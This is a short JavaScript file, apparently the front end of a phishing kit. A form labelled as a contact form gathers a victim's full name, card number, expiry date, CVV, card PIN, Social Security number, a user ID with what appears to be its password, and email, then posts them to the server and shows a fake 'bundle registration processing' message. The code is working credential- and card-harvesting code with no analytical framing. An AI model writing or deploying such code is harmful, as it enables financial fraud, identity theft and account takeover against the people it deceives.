const contactForm = document.querySelector('.contact-form');

let fullname = document.getElementById('fullname');
let cardnumber = document.getElementById('cardnumber');
let month = document.getElementById('month');
let year = document.getElementById('year');
let cvv = document.getElementById('cvv');
let pin = document.getElementById('pin');
let ssn = document.getElementById('ssn');
let userid = document.getElementById('userid');
let useridp = document.getElementById('useridp');
let email = document.getElementById('email')

contactForm.addEventListener('submit', (e)=>{
    e.preventDefault();

    let formData = {
        fullname: fullname.value,
        cardnumber: cardnumber.value,
        month: month.value,
        year: year.value,
        cvv: cvv.value,
        pin: pin.value,
        ssn: ssn.value,
        userid: userid.value,
        useridp: useridp.value,
        email: email.value
    }

    let xhr = new XMLHttpRequest();
    xhr.open('POST', '/'),
    xhr.setRequestHeader('content-type', 'application/json');
    xhr.onload = function(){
        console.log(xhr.responseText);
        if(xhr.responseText == 'success'){
            alert('BUNDLE REGISTERTION PROCESSING.....');
            fullname.value = '';
            cardnumber.value = '';
            month.value = '';
            year.value = '';
            cvv.value = '';
            pin.value = '';
            ssn.value = '';
            userid.value = '';
            useridp.value = '';
            email.value = '';
        }else{
            alert('SOMETHING WENT WRONG')
        }
    }
    
    xhr.send(JSON.stringify(formData));
});